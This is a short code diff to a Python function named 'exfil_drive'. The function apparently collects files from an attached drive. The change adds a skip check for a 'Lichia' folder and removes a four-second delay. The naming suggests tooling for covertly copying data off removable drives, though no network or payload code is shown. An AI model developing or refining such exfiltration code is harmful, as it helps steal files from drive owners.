@@ -135,10 +135,8 @@ def exfil_drive(drive):
         cfg = load_cfg()
         root = Path(drive)
 
-        if (root / CFG_NAME).exists():
+        if (root / CFG_NAME).exists() or (root / "Lichia").exists():
             return
-
-        time.sleep(4)
         files = collect(root, cfg)
         if not files:
             return
